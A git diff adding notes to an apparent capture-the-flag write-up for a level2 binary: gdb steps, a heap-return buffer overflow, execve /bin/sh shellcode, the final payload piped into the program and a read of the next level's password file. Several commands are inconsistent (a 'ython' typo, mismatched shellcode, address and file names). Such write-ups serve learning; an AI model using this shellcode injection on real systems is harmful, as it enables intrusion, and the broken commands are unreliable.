@@ -8,4 +8,32 @@ disas main
 disas p
 
 # We can see call of gets, printf, strdup. Seems like we cant use the same exploit than last level with EIP, stack is lock this time.
-# We will probably need to find an other way to use buffer overflow 
+# We will probably need to find an other way to use buffer overflow
+# We can see a call of strdup, seems like it return the string given as param, let's try to jump on this return
+# first, breakpoint on strdup return
+
+b *0x0804853d
+r
+# AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVXXXXYYYYZZZZ, we gave that string to our program
+# Program received signal SIGSEGV, Segmentation fault. 0x55555555 in ?? () 
+# let's see what is the adress of eax
+x/s $eax
+# 0x804a008
+# We want to open a shell code by ourselves, let's check on the internet
+# \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+# Let's put that on our string but we need to calculate the len of this shell to complete the string with random characters and the adress
+# count size of shell code
+# \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80HHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT + address
+# struct.pack("I", 0x804a008)
+	'\x08\xa0\x04\x08'
+# Final string is : \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80HHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT\x08\xa0\x04\x08
+# Let's use the same exploit with cat and pipe
+ython -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'a' * 55 + '\x08\x04\x84\xcf'[::-1])" > /tmp/script
+(cat /tmp/xxxx; cat) | ./level2
+cat /home/user/level3/.pass
+
+# Useful ressources :
+# https://dhavalkapil.com/blogs/Shellcode-Injection/
+# https://docs.python.org/3/library/struct.html
+# https://thinkloveshare.com/hacking/pwn_2of4_ret2libc/
+
